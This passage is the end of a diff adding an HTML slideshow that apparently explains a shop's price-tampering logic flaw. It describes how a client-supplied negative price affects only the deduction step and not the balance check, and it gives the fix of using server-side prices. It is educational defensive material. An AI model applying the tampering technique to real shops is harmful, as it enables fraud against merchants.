+            5: `利用时最容易踩的坑——<span class="warning-text">顺序反了</span>：先用正数消费把余额扣成负数，再想用负数加回来。<br><br>
+但负数只在【② 扣款】生效，而【① 检查】永远先执行。余额一旦为负，所有商品真实价（200 / 300 / 2000）都大于负数余额 → 检查恒拦截 → 扣款永远不可达 → <span class="underline-wavy">账号报废，无法自救</span>。只能换新用户名重来。`,
+
+            6: `修复的唯一原则：<span class="highlight">同一个业务事实只用一个数据源</span>。校验与扣款都使用服务端从数据库读出的真实价格，客户端只允许提交商品 ID 与数量。<br><br>
+逻辑漏洞往往没有"技术含量"，考验的是对业务流的理解：凡涉及金额、数量、权限的参数，永远让服务端说了算。`
+        };
+
+        function showTextImmediate(pageNum) {
+            const textId = 'text' + pageNum;
+            const textEl = document.getElementById(textId);
+            if (textEl && texts[pageNum]) {
+                textEl.innerHTML = texts[pageNum];
+            }
+        }
+
+        function showPage(pageNum) {
+            pages.forEach((page, index) => {
+                page.classList.remove('active', 'flipped');
+                if (index < pageNum) {
+                    page.classList.add('flipped');
+                } else if (index === pageNum) {
+                    page.classList.add('active');
+                    showTextImmediate(pageNum);
+                }
+            });
+            currentPage = pageNum;
+        }
+
+        function nextPage() {
+            if (currentPage < totalPages - 1) {
+                showPage(currentPage + 1);
+            }
+        }
+
+        function prevPage() {
+            if (currentPage > 0) {
+                showPage(currentPage - 1);
+            }
+        }
+
+        document.querySelector('.page.cover').addEventListener('click', nextPage);
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'ArrowRight' || e.key === ' ') {
+                nextPage();
+            } else if (e.key === 'ArrowLeft') {
+                prevPage();
+            }
+        });
+
+        showPage(0);
+    </script>
+</body>
+</html>
